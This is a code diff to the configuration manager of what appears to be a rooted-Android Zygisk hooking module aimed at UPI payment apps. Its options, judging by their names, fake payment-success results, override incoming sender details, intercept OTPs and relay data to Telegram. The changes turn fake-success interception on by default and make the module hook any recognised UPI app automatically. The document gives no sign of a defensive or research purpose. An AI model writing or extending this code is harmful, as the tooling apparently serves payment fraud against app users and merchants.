@@ -1,5 +1,6 @@
 #include "config.hpp"
 
+#include "upi_registry.hpp"
 #include <fstream>
 #include <sstream>
 #include <algorithm>
@@ -194,7 +195,6 @@ ConfigManager& ConfigManager::instance() {
 
 bool ConfigManager::load() {
     const std::vector<std::string> paths = {
-        "/sdcard/Android/data/com.hivirtus.zygiskmode/files/hivirtus_zygisk_mode_config.json",
         "/data/local/tmp/hivirtus_zygisk_mode_config.json",
         "/data/adb/modules/hivirtus_zygisk_mode/config.json",
     };
@@ -244,7 +244,8 @@ bool ConfigManager::load() {
     config_.upi_app_timer_bonuses = parse_int_map(json, "upi_app_timer_bonuses");
     config_.override_incoming_sender = parse_bool(json, "override_incoming_sender", true);
     config_.fake_intercept_telegram = parse_bool(json, "fake_intercept_telegram", true);
-    config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", false);
+    config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", true);
+    config_.auto_hook_foreground = parse_bool(json, "auto_hook_foreground", true);
 
     if (config_.otp_patterns.empty()) {
         config_.otp_patterns = {
@@ -264,10 +265,14 @@ void ConfigManager::reload() {
 
 bool ModuleConfig::is_upi_app_hooked(const std::string& package) const {
     if (package.empty()) return false;
-    if (hooked_upi_apps.empty()) return true;
-    const auto it = hooked_upi_apps.find(package);
-    if (it == hooked_upi_apps.end()) return false;
-    return it->second;
+    if (!hooked_upi_apps.empty()) {
+        const auto it = hooked_upi_apps.find(package);
+        if (it != hooked_upi_apps.end()) return it->second;
+    }
+    if (auto_hook_foreground) {
+        return upi_registry::is_known_upi(package);
+    }
+    return false;
 }
 
 int default_timer_for_package(const std::string& package) {
